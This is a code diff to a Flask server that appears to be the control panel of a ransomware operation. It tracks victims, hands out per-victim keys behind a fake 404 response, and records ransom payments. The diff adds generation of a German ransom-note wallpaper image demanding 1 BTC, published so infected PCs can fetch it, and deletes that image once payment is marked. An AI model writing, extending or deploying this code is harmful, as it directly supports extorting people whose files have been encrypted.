@@ -1,10 +1,23 @@
 from flask import render_template, url_for, flash, redirect, request, make_response
+from PIL import Image, ImageDraw, ImageFont
 from app import app, db, auth, verify_password
 from werkzeug.security import check_password_hash
 from app.models import Victim, load_victim
 import random, os
 import base64
 import nacl
+
+# Automatically creates a image file with the specified ransom note
+# The image will be saved in a publicly available manner, so that an
+# infected PC can pull it and set is as PC wallpaper
+def create_custom_wallpaper(id, username, ip):
+    img = Image.new("RGB", (1920, 1080))
+    font = ImageFont.truetype("./app/static/agency.ttf", 37)
+    text = f"Hallo {username},\n\nDein PC wurde nun von einer Ransomware befallen. Deine entsprechenden Daten wurden verschlüsselt und sind nicht mehr aufrufbar.\nUm wieder Zugriff zu erhalten müssen Sie 1 BTC (25000€) an folgendes Wallet überweisen : RANDOMSTRING123\nNach Eingang der Zahlung werden Ihre Daten wieder entschlüsselt.\n\nDeine IP zum Infektionszeitpunkt war die: {ip}\n\nVielen Dank.\nMit freundlichen Grüßen\n\nGerman Hacker"
+
+    d = ImageDraw.Draw(img)
+    d.text((10, 10), text, font=font, fill=(255, 0, 0))
+    img.save(f"./app/static/wp/{id}.png")
 
 
 # Show an overview of all victims currently registered in the database
@@ -49,6 +62,9 @@ def createVictim():
         )
         db.session.add(victim)
         db.session.commit()
+        create_custom_wallpaper(
+            str(victim_id), request.form["username"], request.form["ip"]
+        )
         response = make_response(render_template("404.html"), 404)
         response.headers["Victim-Id"] = str(victim_id)
         response.headers["Victim-Key"] = victim_key
@@ -77,6 +93,7 @@ def receivePayment(victim_id):
     victim.payment_received = True
     victim.archived = True
     db.session.commit()
+    os.remove(f"./app/static/wp/{victim_id}.png")
     return redirect(url_for("displayIndex"))
 
 
